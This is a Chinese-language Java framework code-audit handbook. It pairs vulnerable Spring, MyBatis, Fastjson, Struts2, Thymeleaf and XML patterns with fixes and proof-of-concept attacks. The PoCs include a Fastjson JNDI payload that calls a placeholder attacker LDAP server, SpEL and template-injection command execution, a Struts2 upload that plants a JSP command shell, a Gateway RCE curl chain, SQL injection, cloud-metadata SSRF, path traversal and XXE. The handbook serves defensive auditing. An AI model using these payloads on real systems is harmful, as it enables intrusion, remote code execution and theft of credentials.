---
name: kb_java_audit_deep_2026
description: Java 框架代码审计纵深手册——Spring Security 鉴权绕过 / MyBatis SQLi / 反序列化 / SpEL 表达式注入 / SSRF·上传·穿越·XXE / CVE 拆解 / 审计流程。每个模式含漏洞代码+修复对比+可复现 PoC。
tags: [java, code-audit, spring, mybatis, deserialization, spel, ssti, ssrf, xxe, struts2, fastjson, security]
date: 2026-08-14
---
# Java 框架代码审计纵深手册（2026）

> 定位：比 `kb_code_audit_source_2026.md`（通用方法论）深一层的**框架专题纵深**。面向已拿到源码/字节码的授权代码审计，直接给模式、Sink、PoC、判定门槛。情报时效 2024-2026（已用 WebSearch 核实）。

## 0. 审计前置：依赖版本检查（SCA）

先锁定版本，命中 N-Day 直接省掉手工挖。**判定门槛**：命中 CVE 且使用场景满足触发条件（配置错误、版本区间）才算真漏洞，仅引用了高版本 CVE 组件但不受影响不算。

```bash
# 依赖树 → 版本
mvn dependency:tree -Dincludes=org.springframework:*,com.alibaba:fastjson,org.apache.struts:*
# SCA 工具（离线/在线均可）
owasp dependency-check --scan ./target --format HTML --out ./sca-report
trivy fs --severity HIGH,CRITICAL ./pom.xml
# 版本硬伤速查表（2026 生效区间）
# Spring Framework 5.3.x/6.0.x/6.1.x      → 6.1.14+/6.0.25+ 修复 CVE-2024-38819
# fastjson < 1.2.83                       → CVE-2022-25845；<1.2.48 → CVE-2025-70974
# Struts2 2.5.x<2.5.33 / 6.x<6.3.0.2      → S2-066/S2-067 上传 RCE
```

## 1. Spring Boot / Spring Security 鉴权绕过链

### 1.1 审计切入点

- 所有 `SecurityFilterChain` / `WebSecurityConfigurerAdapter`（旧）Bean
- `@PreAuthorize` / `@PostAuthorize` / `@Secured` 方法注解所在 Controller/Service
- 自定义 `Filter`（登录态注入、白名单 URL 判断）、`OncePerRequestFilter`
- `HandlerInterceptor`、`WebMvcConfigurer#addInterceptors`（只拦 controller 不拦静态资源）

### 1.2 配置错误：规则顺序 + anyRequest 兜底

```java
@Bean
SecurityFilterChain chain(HttpSecurity http) {
    http.authorizeHttpRequests(auth -> auth
        // ① 危险：/api/** 在更具体的规则之前且直接放行，覆盖其下所有子路径
        .requestMatchers("/api/**").permitAll()
        .requestMatchers("/api/admin/**").hasRole("ADMIN")   // 永不生效（先被 /api/** 吃掉）
        .requestMatchers("/actuator/**").permitAll()         // ② 管理端点裸奔
        .anyRequest().permitAll()                            // ③ 兜底放行 = 未列举全公开
    );
    http.csrf(csrf -> csrf.disable());                        // ④ 只应为无状态 API 关
    return http.build();
}
```
**判定门槛**：`anyRequest().permitAll()` + 存在受保护资源可未认证访问 = 真漏洞；仅 `permitAll` 某些匿名可访问资源（登录页/静态）不构成。
**修复对比**：
```java
auth.requestMatchers("/login", "/css/**", "/js/**").permitAll()
    .requestMatchers("/actuator/**").hasRole("ADMIN")
    .requestMatchers("/api/**").authenticated()
    .anyRequest().authenticated()        // 兜底必须认证，宁可 403 不漏放
```

### 1.3 路径归一化差异（分号 / 编码 / 双斜杠 / 矩阵参数）

Spring Security 的 `StrictHttpFirewall` 默认**直接拒绝** `;` `%2f` `%5c` `\\` `//` 等，直连 403 反而安全。**真正的洞出现在「反向代理归一化 ≠ 应用归一化」**：

- Nginx `alias` off-by-slash：`location /admin { alias /var/www/app/admin/; }`，请求 `/admin../conf` 或 `/admin/../conf` 路径被 Nginx 拼到 alias 上，代理层和应用层解析出的资源不同。
- 双层编码：外层防火墙只见 `%252f` 不拦截，Tomcat 解码后变 `/`。
- 应用自己用「字符串 startsWith / 正则匹配」做鉴权（不走 SecurityFilterChain）：
```java
// 危险：基于原始 URI 的 startsWith 白名单，可被矩阵参数/双斜杠绕过
if (!request.getRequestURI().startsWith("/public")) {
    // 拦截逻辑...
}
// 绕过：GET /public;admin/list  → getRequestURI() 以 /public 开头放行
// 绕过：GET //public/admin      → 某些容器归一化 //public → /public
```
**审计要点**：凡自定义鉴权用了 `getRequestURI()`（原始）而非 `getServletPath()`/`getPathInfo()`，或用了 `String.startsWith/contains`，一律标为需验证项。
**修复对比**：统一走 `requestMatchers()`；自定义判断用 `PathPattern` / `AntPathMatcher` 解析后的归一化路径，并对 `;`、`//`、`..`、URL 编码做显式拒绝。

### 1.4 Actuator 暴露绕过

```properties
# 危险配置：全量暴露 + 未鉴权（配合 CVE-2022-22947 可直接 RCE，见 §6.3）
management.endpoints.web.exposure.include=*
management.endpoint.health.show-details=always
```
**判定门槛**：`/actuator/env` `/heapdump` `/gateway/routes` 等敏感端点可未认证访问且泄露凭据/类路径/JVM 堆（heapdump 可提取配置中的 AK/SK）= 真漏洞；仅 `health`/`info` 公开不算。

### 1.5 CORS 配置错误

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    public void addCorsMappings(CorsRegistry registry) {
        // 危险：Credentials + 任意来源，等于把已登录态开放给任意站
        registry.addMapping("/**").allowedOrigins("*").allowCredentials(true);
    }
}
```
**判定门槛**：`allowedOrigins("*") + allowCredentials(true)` 且接口含敏感数据（浏览器带 Cookie 可跨域读）= 真漏洞；无 Credentials、无敏感数据的宽松 CORS 不构成。

### 1.6 @PreAuthorize 方法参数解析差异

```java
// 危险：在「方法级」注解上直接拼接 SpEL 校验，参数默认值/类型转换差异可绕过
@PreAuthorize("hasRole('ADMIN') or #user.id == authentication.principal.id")
public User getUser(@RequestParam Long id, @AuthenticationPrincipal User user) { ... }
```
绕过面：`authentication.principal` 为空抛异常但**未验证时方法可能先执行**（配合异常吞掉）；SpEL 中 `#user.id` 对 null 返回 null 而非 false；参数绑定类型混淆（`1` vs `1.0`）。**审计重点**：方法级注解遗漏、类级注解被方法覆盖、`@EnableGlobalMethodSecurity` 未开启。
**修复对比**：类级 `@PreAuthorize` 兜底 + 方法级只做细粒度；SpEL 用 `principal.username` 且对 null 显式拒绝。

## 2. MyBatis / MyBatis-Plus SQLi 模式

### 2.1 审计切入点

- XML Mapper 中所有 `${}`（`#{}` 是预编译安全的，`${}` 是裸拼接）
- `QueryWrapper` 的 `apply` / `last` / `orderBy*` / `having` / `inSql` / `setSql` / `select`（字符串列）
- `Page` / `IPage` 的 `orderByField`/`orderBy`，`PageInterceptor` 分页参数
- 自定义 `Interceptor`（插件）改写 SQL 的环节

### 2.2 XML 中 ${} 注入

```xml
<select id="page" resultType="map">
  SELECT * FROM t_user
  <if test="name != null"> AND name LIKE '%${name}%' </if>   <!-- 注入点1：LIKE 裸拼 -->
  ORDER BY ${sortCol} ${sortDir}                              <!-- 注入点2：排序裸拼 -->
</select>
```
**PoC**（MySQL）：
```bash
# LIKE 注入
curl -g 'http://t/api/user?name=%27%20OR%201=1%20--%20'
# order by 布尔/时间盲注（无回显用时间）
curl -g 'http://t/api/user?sortCol=(select%201%20from%20(select%20sleep(5))a)'
```
**修复对比**：
```xml
AND name LIKE CONCAT('%', #{name}, '%')      <!-- #{} 预编译 -->
```
排序列**必须白名单**（预编译无法作用于标识符）——枚举列名映射，非法即拒绝或回退主键：
```java
private static final Set<String> SORT_OK = Set.of("id","create_time","name");
if (!SORT_OK.contains(col)) col = "id";
```

### 2.3 MyBatis-Plus QueryWrapper 系（CVE-2024-35548 同类）

```java
// 危险：字符串直接进 apply/last/orderByAsc —— 预编译救不了标识符
QueryWrapper<User> qw = new QueryWrapper<>();
qw.apply("date_format(create_time, '%Y') = " + year);  // 注入点
qw.last("limit " + pageSize);                          // 注入点（last 拼到 SQL 尾部）
qw.orderByAsc(sortField);                              // CVE-2024-35548 即此类
userMapper.selectList(qw);
```
**PoC**（时间盲注，yu-picture 实战，未授权可达）：
```bash
curl -X POST 'http://t/api/picture/list/page/vo' -H 'Content-Type: application/json' \
  -d '{"sortField":"(SELECT 1 FROM (SELECT SLEEP(3))t)","sortOrder":"ascend"}'
# 响应 ~3s → SLEEP 执行成功 → 逐字符外带 data
```
**修复对比**：`qw.orderByAsc(User::getCreateTime)`（Lambda 走列名引用，无字符串拼接）；`apply/last/inSql` 一律不允许用户输入；排序列白名单。**注意** `camel2underStr`/`replaceAllBlank` 只是驼峰转换/去空白，**不是安全过滤**，空格变体（`upda te_time`）、注释符可绕过黑名单。

### 2.4 判定门槛

- `#{}` 的注入 = 无（预编译）；`${}` 注入 = **必须证明用户输入可达该 ${}**，给出可达调用链 + 可复现 payload（时间差/报错/布尔）。
- 若 `${}` 值来自服务端固定枚举/配置且无外部输入，不构成。

## 3. Java 反序列化审计

### 3.1 审计切入点

- `JSON.parseObject/parse/parseArray`（Fastjson）、`ObjectMapper.readValue`（Jackson）
- `ObjectInputStream.readObject/readUnshared`、RMI/JMX/JMS 反序列化入口
- `XMLDecoder`、`XStream.fromXML`、`SnakeYAML`、`Hessian2Input`、`kryo`、`JYaml`
- 间接点：`shiro rememberMe`、`dubbo/hessian` 协议、`Feign` 泛化调用、`MQ`（`@RabbitListener` 反序列化）

### 3.2 Fastjson 触发点定位

```java
// 危险1：外部输入直接 parse，版本旧 → 黑名单绕过链
String data = request.getParameter("data");
JSONObject obj = JSON.parseObject(data);        // parse/parseObject 即触发点
// 危险2：显式开 autoType（任何版本都废，GHSL-2024-282 实证 1.2.83+autoType 仍 RCE）
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
JSON.parseObject(data, Object.class);
```
**PoC**（1.2.24–1.2.47 经典 JNDI）：
```bash
curl -X POST 'http://t/api/json' -H 'Content-Type: application/json' \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<your-attack-server>:1389/Exploit","autoCommit":true}'
# 1.2.68-1.2.83 autoType 关态绕过 → jar:http 探测（CVE-2026-16723 类）：
#   {"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
```
**修复对比**：
```java
ParserConfig.getGlobalInstance().setSafeMode(true);   // 完全禁用 autoType
// 或升级 fastjson2（com.alibaba.fastjson2），并对输入做类型白名单/深度限制
```

### 3.3 Jackson 任意类型反序列化

```java
// 危险：开启默认类型多态 + Object 接收 → 任意类实例化
ObjectMapper om = new ObjectMapper();
om.enableDefaultTyping();              // activateDefaultTyping(ALL) 同义
Object o = om.readValue(request.getParameter("data"), Object.class);
// PoC: {"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://...","autoCommit":true}
```
**修复对比**：不启用 defaultTyping；必须多态时 `@JsonTypeInfo(use=Id.NAME)` + `@JsonSubTypes` 白名单；或配 `JsonTypeInfoValidator`。

### 3.4 XMLDecoder / XStream / 自实现

```java
// XMLDecoder：任意方法调用（writeObject → Runtime.exec 攻击链）
XMLDecoder d = new XMLDecoder(request.getInputStream());
Object obj = d.readObject();
```
```java
// XStream：CVE-2017-9805 系，fromXML 即触发
XStream x = new XStream();
Object o = x.fromXML(userInput);
```
**修复对比**：XMLDecoder 严禁解析外部 XML（无可控白名单），改用 JSON 或 `DocumentBuilder` 只读 + 硬编码 DTD 禁用；XStream 需 `x.setupDefaultSecurity(); x.allowTypes(白名单);`。

### 3.5 二次反序列化（穿透型）

Shiro `rememberMe`（AES 密钥硬编码/弱密钥 → URLDNS 探测 → CB1_183 链 RCE）、Fastjson 在 `JSONObject` 内嵌 gadget、`Serializable` DTO 经过 Redis/MQ 缓存后再 `readObject`。**审计重点**：找到「外部输入 → 序列化字节 → 反序列化点」的完整链路，任一环可控即中。
**判定门槛**：反序列化点必须**可达外部输入**（HTTP body/参数/MQ 消息/缓存值），且没有类白名单防护；仅内部对象互传（无外部可控字节）不构成。

## 4. SpEL / OGNL / 表达式注入（含 SSTI）

### 4.1 审计切入点

- `SpelExpressionParser` / `ExpressionParser` 解析**用户可控字符串**
- `@Value("#{...}")`、`@PostConstruct` 中 `expression.getValue(ctx)`（配置注入）
- Spring Cloud Gateway `RouteDefinition` 过滤器 args（CVE-2022-22947）
- Thymeleaf / FreeMarker / Velocity 模板，控制器返回**拼接的视图名**

### 4.2 SpEL 用错 EvaluationContext

```java
// 危险：StandardEvaluationContext 支持 T()/new/方法调用 = 全功能
SpelExpressionParser p = new SpelExpressionParser();
StandardEvaluationContext ctx = new StandardEvaluationContext();
Object r = p.parseExpression(request.getParameter("expr")).getValue(ctx);
// PoC: T(java.lang.Runtime).getRuntime().exec('calc')
//      或反射链: T(java.lang.Class).forName('javax.script.ScriptEngineManager')...
```
**修复对比**：换 `SimpleEvaluationContext`（无类型引用、无构造器、无 bean 引用）+ `ctx.setTypeLocator(t -> { throw ...; })`。

### 4.3 Thymeleaf 视图名拼接 SSTI

```java
// 危险：视图名拼用户输入（Spring 把视图名按 "~{...}" 片段表达式解析）
@GetMapping("/doc/{view}")
public String doc(@PathVariable String view) { return "doc/" + view; }
// 或返回 void/Map/Model 时，视图名由请求 URI 推导（RequestToViewNameTranslator）
@GetMapping("/redir/**")
public void redir() { /* 视图名 = URI，同样可控 */ }
```
**PoC**（Thymeleaf ≤3.1.3；3.1.4 起加了 `checkViewNameNotInRequest`，用路径不一致绕过）：
```bash
# 经典：__${...}__ 预处理器先求值，::.x 补全 fragment 语法
curl 'http://t/doc/__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x'
# 3.1.4 绕过：URL 原始路径与解析后视图名不一致
curl 'http://t/aaa;/(__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x)'
curl 'http://t/aaa////(__${...}__::.x)'
```
**修复对比**：视图名**永不拼接用户输入**；按枚举/白名单返回固定模板；升级 Thymeleaf 3.1.4+；`@RequestMapping` 用白名单路径。

### 4.4 FreeMarker / Velocity

```java
// FreeMarker：模板内容或 Template 名来自外部
Template t = new Template("t", new StringReader(userInput), cfg);
t.process(rootMap, out);   // 模板即代码
// PoC: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
// 高危链: <#assign c=...ObjectConstructor?new()>${c("java.lang.ProcessBuilder","id")}
```
**修复对比**：模板文件静态化放 classpath，绝不接收用户模板串；运行时模板用 `TemplateClassResolver.SAFER_RESOLVER` 禁用新类。

## 5. SSRF / 文件上传 / 路径穿越 / XXE 的 Java 模式

### 5.1 SSRF

```java
@GetMapping("/proxy")
public String proxy(@RequestParam String url) throws Exception {
    // 危险：URL 直通，无协议/域名/IP 校验，且跟随重定向
    URL u = new URL(url);
    try (InputStream in = u.openStream()) { return new String(in.readAllBytes()); }
    // 或 RestTemplate/HttpClient: restTemplate.getForObject(url, String.class);
}
// PoC: ?url=http://169.254.169.254/latest/meta-data/  → 云元数据 AK/SK
//      ?url=http://127.0.0.1:8080/actuator/env        → 内网横向
//      ?url=gopher://127.0.0.1:6379/...               → Redis 未授权写入
```
**修复对比**：协议白名单（http/https）；解析后 `InetAddress` 拒绝回环/私网/链路本地/云元数据段（169.254.0.0/16、100.100.100.200、metadata.tencentyun.com）；禁止跟随 302；用 `URI` 而非 `URL` 解析避免协议混写。**判定门槛**：能读到云元数据/内网敏感数据才算，仅能触发 DNSLog 回连（有出网）不构成独立漏洞但可作辅助证据。

### 5.2 文件上传

```java
@PostMapping("/upload")
public String up(@RequestParam("file") MultipartFile file) throws IOException {
    String name = file.getOriginalFilename();          // 用户可控，含 ../ 与扩展名
    file.transferTo(new File("/app/upload/" + name));  // 路径穿越 + 可执行后缀
    // 危险升级：后缀只做前端黑名单，解析器可解析 jsp 的变体：.jspx/.jsp%00/.jsp::$DATA
}
// PoC: multipart filename="../../webapps/ROOT/shell.jsp"
```
**修复对比**：
```java
String fname = Paths.get(file.getOriginalFilename()).getFileName().toString(); // 去路径
String ext = fname.substring(fname.lastIndexOf('.') + 1);
if (!ALLOWED.contains(ext)) throw new BizException("类型不允许");
String store = UUID.randomUUID().toString() + "." + ext;   // 随机化落盘名
file.transferTo(new File(UPLOAD_DIR, store));
// 再叠加：UPLOAD_DIR 不放在可执行 webroot、Content-Type 服务端二次校验、存储与访问分离
```

### 5.3 路径穿越

```java
String base = "/app/data/";
byte[] data = Files.readAllBytes(Paths.get(base + request.getParameter("file")));
// PoC: ?file=../../etc/passwd
//      ?file=..%2f..%2fetc%2fpasswd（容器自动解码）
//      ?file=....//....//etc/passwd（部分黑名单绕过，/ 前的 .. 被吃）
```
**修复对比**：
```java
Path bp = Paths.get(base).toAbsolutePath().normalize();
Path fp = bp.resolve(request.getParameter("file")).normalize();  // resolve 再 normalize
if (!fp.startsWith(bp)) throw new BizException("非法路径");       // 关键校验
```

### 5.4 XXE

```java
// 危险：DocumentBuilderFactory/SAXParserFactory 默认不禁外部实体（老 JDK）
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(request.getInputStream());
// PoC: <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
//      盲注: <!ENTITY x SYSTEM "http://dnslog.cn/x">
//      OOB: 参数实体 + 外带 DTD 读文件
```
**修复对比**（四连禁，缺一不可）：
```java
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```
StAX 场景同样给 `XMLInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", false)`。**判定门槛**：能读文件/OOB 回连且回显或外带拿到内容才算；仅解析了畸形 XML 抛异常不算。

## 6. 真实 CVE 案例拆解（2023–2026）

### 6.1 S2-066 / CVE-2023-50164 → S2-067 / CVE-2024-53677（Struts2 上传 RCE）

**根因**：`HttpParameters` 的 `remove/contains/get` 对参数名**大小写敏感**。`uploadFileName` 与 `UploadFileName` 被视为不同参数，但 Bean 属性反射把它们当同一个 setter → 同名参数覆盖，绕过 `FileUploadInterceptor` 的 `getCanonicalName()` 路径清洗。
```http
POST /upload.action HTTP/1.1
Content-Type: multipart/form-data; boundary=----W
------W
Content-Disposition: form-data; name="upload"; filename="a.txt"
Content-Type: text/plain
<%=Runtime.getRuntime().exec(request.getParameter("c"))%>
------W
Content-Disposition: form-data; name="UploadFileName"
../../shell.jsp
------W--
```
**修复对比**：≥2.5.33 / ≥6.3.0.2；**官方要求改写为新的 `ActionFileUploadInterceptor` 机制**（不兼容升级，旧机制继续用仍漏洞）。S2-067 是 S2-066 的不完整修补（2024-12，CVSS 9.5），2024-12 起已被蜜罐捕获 in-the-wild 打 JSP 马。

### 6.2 Spring Cloud Gateway CVE-2022-22947（SpEL RCE，CVSS 10）

**根因**：`ShortcutConfigurable#getValue` 用 `StandardEvaluationContext` 解析过滤器 args 的 SpEL；修复换成受限的 `GatewayEvaluationContext`（基于 `SimpleEvaluationContext`）。
```bash
# 前置：actuator gateway 端点暴露未鉴权
curl -X POST 'http://t:8080/actuator/gateway/routes/hack' -H 'Content-Type: application/json' \
 -d '{"id":"hack","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],"uri":"http://example.com"}'
curl -X POST 'http://t:8080/actuator/gateway/refresh'     # 触发表达式求值
curl 'http://t:8080/actuator/gateway/routes/hack'          # 回读命令结果
```
**修复**：3.1.1+ / 3.0.7+；`management.endpoint.gateway.enabled=false`；网关端点加鉴权+网段限制。审计标志：`GatewayControllerEndpoint` 可达 + 路由可外部创建。

### 6.3 Fastjson 家族时间线

| CVE | 区间 | 要点 |
|---|---|---|
| CVE-2017-18349 | <1.2.25 | autoType 黑名单早期，JNDI 直打 |
| CVE-2022-25845 | <1.2.83 | 默认 autoType 关态的多种绕过（Groovy 链等） |
| CVE-2025-70974 | <1.2.48 | CVE-2017-18349 不完整修补，2023–2025 在野利用，CVSS 10 |

**关键审计结论**：版本新 ≠ 安全。**只要业务 `setAutoTypeSupport(true)`，1.2.83+ 照样 RCE**（GHSL-2024-282 实证）。审计先查全局 `ParserConfig`/`JSON.parseObject(...,Feature.SupportAutoType)`/`@JSONType(autoTypeSupport=true)` 配置，再查外部输入到达点。

### 6.4 CVE-2024-38819 Spring 函数式路由路径穿越（LFI）

```java
@Bean RouterFunction<ServerResponse> files() {
    // 危险：FileSystemResource 静态资源 + 外部可控路径 → 任意文件读
    return RouterFunctions.resources("/files/**", new FileSystemResource("/app/data"));
}
// PoC: GET /files/../../etc/passwd   （WebMvc.fn/WebFlux.fn 均中，Tomcat/Jetty 也中）
```
**修复**：5.3.41/6.0.25/6.1.14；改用 `ClassPathResource` 或 `PathResourceResolver` + 基准目录 `startsWith` 校验。**注意**：受 Spring Security HTTP Firewall 保护的实例自动免疫（请求被拦）。同族 CVE-2024-38816 为第一报告（仅 Netty）。

### 6.5 CVE-2024-50379 Tomcat PUT 任意写/覆盖 → RCE

DefaultServlet `readonly=false`（PUT 写）+ 对 `.jsp` 的部分请求 + 大小写/路径归一化竞态 → 攻击者覆盖 JSP 获取 RCE。**审计标志**：`web.xml` 中 DefaultServlet `readonly` 配置、`servlet` 支持 PUT/DELETE。**修复**：保持 `readonly=true`、限制 PUT 目录、禁 JSP 可写目录。注意该洞触发依赖 write 能力与 Windows/大小写语义，判定需实际复现。

### 6.6 CVE-2024-22259 / CVE-2024-22262 UriComponentsBuilder 解析绕过

`fromUriString()` 解析外部 URL 后做 host 校验（重定向/SSRF 白名单）被绕过：`http://[`未闭合括号、scheme 含 `http` 无 host、反斜杠 `\` 被浏览器归一化为 `/` 而解析器当 host 一部分。**审计标志**：`RedirectView`/`UriComponentsBuilder`/`new URL(...).getHost()` 做安全决策。**修复**：6.1.5+/6.0.18+/5.3.33+；安全决策不用解析器结果，显式 allowlist host。

## 7. 审计流程纵深（拿到源码后 30 分钟出 P0）

```
① SCA 锁版本         mvn dependency:tree + trivy → 命中即查 §0 速查表/CVE 拆解
② 入口点定位         Controller @RequestMapping + Feign Client + @RabbitListener/@KafkaListener
                     + @Scheduled + RPC/WebService 实现类 + MQ 消费 DTO
③ Sink 画像          grep -R 特征串（见各节审计切入点，优先级见下）
④ 数据流追溯        入口参数 → Controller → Service → DAO/Sink，逐层确认无校验/无白名单
⑤ 本地复现           IDEA 断点 / docker 起同版本依赖环境 → 构造 PoC 请求 → 确认时间差/报错/文件/回连
⑥ 判定门槛          可复现 + 外部输入可达 + 有实际影响（§各节门槛）→ 才进报告
```
**Sink 优先级（按性价比）**：`${}` XML → `JSON.parse` → `Runtime.exec`/`ProcessBuilder` → `new File/Paths.get` → `SpelExpressionParser` → `Class.forName/loadClass` → `XmlMapper/XMLDecoder` → `ObjectMapper.enableDefaultTyping` → `restTemplate/HttpClient(URL)` → `MessageConverter`。
```bash
# 一批 grep 命令直达高风险点
grep -rn 'parseObject\|parse(' --include=*.java src | grep -v test
grep -rn '\${' --include=*.xml src/main/resources/mapper
grep -rn 'enableDefaultTyping\|activateDefaultTyping\|fromXML\|readObject\|SpelExpressionParser' --include=*.java src
grep -rn 'Runtime.getRuntime()\|ProcessBuilder' --include=*.java src
grep -rn 'getOriginalFilename\|transferTo\|new File(' --include=*.java src
grep -rn 'request.getParameter\|@RequestParam\|@PathVariable' --include=*.java src | wc -l
```

## 8. Sources

- Spring CVE-2024-22259/CVE-2024-22262 分析（奇安信）: https://forum.butian.net/share/2810 、https://zhi.oscs1024.com/42725.html
- CVE-2024-38819 官方公告: https://staging.spring.io/security/cve-2024-38819 ；PoC lab: https://github.com/trevorputbrese/cve-2024-38819-lab
- Fastjson CVE-2025-70974: https://github.com/advisories/GHSA-jm7w-5684-pvh8 ；CVE-2022-25845: https://app.opencve.io/cve/?product=fastjson&vendor=alibaba ；GHSL-2024-282（1.2.83+autoType 仍 RCE）: https://securitylab.github.com/advisories/GHSL-2024-282_xaecbd_KCenter/
- Struts2 S2-066/S2-067: https://www.acunetix.com/vulnerabilities/web/apache-struts-path-traversal-s2-067-cve-2024-53677-s2-066-cve-2023-50164/
- Spring Cloud Gateway CVE-2022-22947: https://xz.aliyun.com/news/10452 ；复现: https://github.com/twseptian/cve-2022-22947
- MyBatis-Plus CVE-2024-35548 实战: https://github.com/liyupi/yu-picture/issues/4 ；MySQL 伪预编译深度: http://cn-sec.com/archives/4970185.html
- Thymeleaf SSTI: https://feed.craftedsignal.io/briefs/2024-01-29-thymeleaf-ssti/ ；SpringBoot 下 Thymeleaf 全版本 SSTI 研究: https://bbs.huaweicloud.cn/blogs/441106
- CVE-2024-50379 Tomcat（Tanzu SSO 引用）: https://techdocs.broadcom.com/us/en/vmware-tanzu/platform/single-sign-on/1-16/sso/cve-fixes.html
- CVE-2025-22233/CVE-2025-22232（Spring 公告）: https://staging.spring.io/security
